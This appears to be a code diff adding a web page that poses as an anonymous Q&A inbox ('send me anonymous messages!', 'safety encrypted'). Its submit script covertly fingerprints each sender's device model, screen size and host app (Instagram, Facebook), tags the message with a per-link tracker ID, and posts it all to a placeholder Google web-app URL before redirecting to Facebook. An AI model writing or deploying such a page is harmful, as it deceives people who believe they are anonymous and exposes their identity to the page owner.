@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Inquire - Anonymous Q&A</title>
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <style>
+        body { background-color: #F9E6DF; }
+    </style>
+</head>
+<body class="font-sans antialiased text-gray-800 min-h-screen flex flex-col items-center justify-center p-4">
+
+    <div id="submission-view" class="w-full max-w-md bg-white/80 backdrop-blur-md rounded-3xl p-6 shadow-xl border border-white/40 text-center">
+        <div class="w-16 h-16 bg-[#E8907A] rounded-full mx-auto mb-4 flex items-center justify-center text-white font-bold text-xl shadow-inner">
+            ?
+        </div>
+        <h1 class="text-xl font-semibold tracking-tight text-gray-900 mb-1">@anonymous</h1>
+        <p class="text-sm text-gray-500 mb-6">send me anonymous messages!</p>
+
+        <form id="message-form" class="space-y-4">
+            <textarea id="message-text" required placeholder="ask me anything..." rows="4" class="w-full p-4 rounded-2xl border border-gray-200 bg-gray-50/50 focus:bg-white focus:ring-2 focus:ring-[#E8907A] focus:border-transparent outline-none transition-all resize-none text-base shadow-sm"></textarea>
+            <button type="submit" id="submit-btn" class="w-full py-3.5 px-4 bg-[#E8907A] hover:bg-[#d67e69] text-white font-medium rounded-2xl shadow-md transition-all cursor-pointer disabled:opacity-50">
+                Send anonymously
+            </button>
+        </form>
+        <p class="text-[11px] text-gray-400 mt-4">🔒 safety encrypted</p>
+    </div>
+
+    <script>
+        // ⚠️ REPLACE THIS STRING WITH YOUR GOOGLE WEB APP URL LATER:
+        const GOOGLE_SCRIPT_URL = "YOUR_DEPLOYED_WEB_APP_URL_HERE";
+        const REDIRECT_URL = "https://www.facebook.com"; 
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const trackerId = urlParams.get('id') || 'General Story Link';
+
+        document.getElementById('message-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const messageInput = document.getElementById('message-text');
+            const submitBtn = document.getElementById('submit-btn');
+            
+            submitBtn.disabled = true;
+            submitBtn.innerText = "Sending...";
+
+            const ua = navigator.userAgent;
+            let hardwareProfile = "Unknown Device";
+            let browserApp = "Standard Browser";
+
+            if (/iPhone/i.test(ua)) {
+                const h = window.screen.height;
+                hardwareProfile = h >= 932 ? "iPhone Pro Max (14/15/16)" : (h >= 852 ? "iPhone Standard/Pro" : "iPhone (Older/SE)");
+            } else if (/Android/i.test(ua)) {
+                const match = ua.match(/Android\s([0-9\.]+)/);
+                hardwareProfile = match ? `Android (OS ${match[1]})` : "Android Phone";
+            }
+
+            if (/Instagram/i.test(ua)) browserApp = "Instagram App";
+            else if (/FBAN|FBAV/i.test(ua)) browserApp = "Facebook App";
+            else if (/Chrome/i.test(ua)) browserApp = "Chrome";
+            else if (/Safari/i.test(ua)) browserApp = "Safari";
+
+            const payload = {
+                message: messageInput.value,
+                device: `${hardwareProfile} [${window.screen.width}x${window.screen.height}]`,
+                browserApp: browserApp,
+                trackerId: trackerId
+            };
+
+            fetch(GOOGLE_SCRIPT_URL, {
+                method: "POST",
+                mode: "no-cors",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            })
+            .then(() => { window.location.href = REDIRECT_URL; })
+            .catch(() => { window.location.href = REDIRECT_URL; });
+        });
+    </script>
+</body>
+</html>
